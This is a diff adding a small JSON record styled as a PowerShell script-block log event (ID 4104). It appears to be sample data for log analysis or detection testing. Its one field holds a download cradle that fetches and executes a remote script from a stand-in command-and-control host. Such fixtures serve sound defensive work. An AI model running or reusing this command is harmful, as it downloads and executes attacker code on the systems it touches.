@@ -1,0 +1,4 @@
+{
+  "EventID": 4104,
+  "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.corp/c2.ps1')"
+}
